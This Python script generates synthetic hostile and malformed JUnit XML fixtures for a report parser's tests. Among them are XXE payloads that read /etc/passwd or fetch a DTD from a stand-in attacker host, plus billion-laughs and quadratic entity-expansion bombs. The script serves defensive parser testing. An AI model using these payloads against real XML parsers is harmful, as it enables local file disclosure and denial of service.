"""Write the synthetic hostile and malformed JUnit XML samples in this directory.

Every sample here is synthetic: written for this project's tests, not produced by a test tool.
The samples are committed; rerun this script only to change them: python make_samples.py
"""

from pathlib import Path

HERE = Path(__file__).resolve().parent
DECLARATION = '<?xml version="1.0" encoding="UTF-8"?>\n'

LAUGHS = ['  <!ENTITY lol0 "lol">'] + [
    f'  <!ENTITY lol{level} "{f"&lol{level - 1};" * 10}">' for level in range(1, 10)
]

SAMPLES: dict[str, bytes] = {
    # An external entity that would read a local file.
    "xxe-system-entity.xml": (
        DECLARATION
        + "<!DOCTYPE testsuites [\n"
        + '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        + "]>\n"
        + '<testsuites><testsuite name="xxe"><testcase classname="c" name="&xxe;"/></testsuite>'
        + "</testsuites>\n"
    ).encode(),
    # A parameter entity that would fetch a remote DTD.
    "xxe-parameter-entity.xml": (
        DECLARATION
        + "<!DOCTYPE testsuites [\n"
        + '  <!ENTITY % remote SYSTEM "http://attacker.invalid/evil.dtd">\n'
        + "  %remote;\n"
        + "]>\n"
        + "<testsuites/>\n"
    ).encode(),
    # A reference to an external DTD.
    "external-dtd.xml": (
        DECLARATION
        + '<!DOCTYPE testsuites SYSTEM "http://attacker.invalid/junit.dtd">\n'
        + "<testsuites/>\n"
    ).encode(),
    # An internal DTD with no entities: still refused, since reports never need a DTD.
    "internal-dtd.xml": (
        DECLARATION + "<!DOCTYPE testsuites [\n  <!ELEMENT testsuites ANY>\n]>\n<testsuites/>\n"
    ).encode(),
    # Exponential entity expansion: 10^9 copies of "lol".
    "billion-laughs.xml": (
        DECLARATION
        + "<!DOCTYPE testsuites [\n"
        + "\n".join(LAUGHS)
        + "\n]>\n"
        + '<testsuites name="&lol9;"/>\n'
    ).encode(),
    # Quadratic expansion: one large entity referenced many times (scaled down).
    "quadratic-blowup.xml": (
        DECLARATION
        + "<!DOCTYPE testsuites [\n"
        + f'  <!ENTITY a "{"a" * 1000}">\n'
        + "]>\n"
        + '<testsuites><testsuite name="q"><testcase classname="c" name="n">'
        + f'<failure message="{"&a;" * 300}"/>'
        + "</testcase></testsuite></testsuites>\n"
    ).encode(),
    # Invalid UTF-8: 0xC3 starts a two-byte sequence, but 0x28 isn't a continuation byte.
    "invalid-utf8.xml": (
        DECLARATION.encode() + b'<testsuites name="bad \xc3\x28 byte"/>\n'
    ),
    # The declaration says UTF-16, but the bytes are ASCII.
    "encoding-mismatch.xml": b'<?xml version="1.0" encoding="UTF-16"?>\n<testsuites/>\n',
    # A character reference to NUL, which XML 1.0 forbids.
    "invalid-char-reference.xml": (DECLARATION + '<testsuites name="a&#0;b"/>\n').encode(),
    # A report cut off mid-element, as from an interrupted upload.
    "truncated.xml": (
        DECLARATION + '<testsuites><testsuite name="t" tests="1"><testcase classname="c" name="n">'
    ).encode(),
    # An empty file.
    "empty.xml": b"",
    # Well-formed XML that isn't a JUnit report.
    "wrong-root.xml": (DECLARATION + "<html><body>not a test report</body></html>\n").encode(),
}


def main() -> None:
    for name, data in SAMPLES.items():
        (HERE / name).write_bytes(data)
        print(f"wrote {name} ({len(data)} bytes)")


if __name__ == "__main__":
    main()
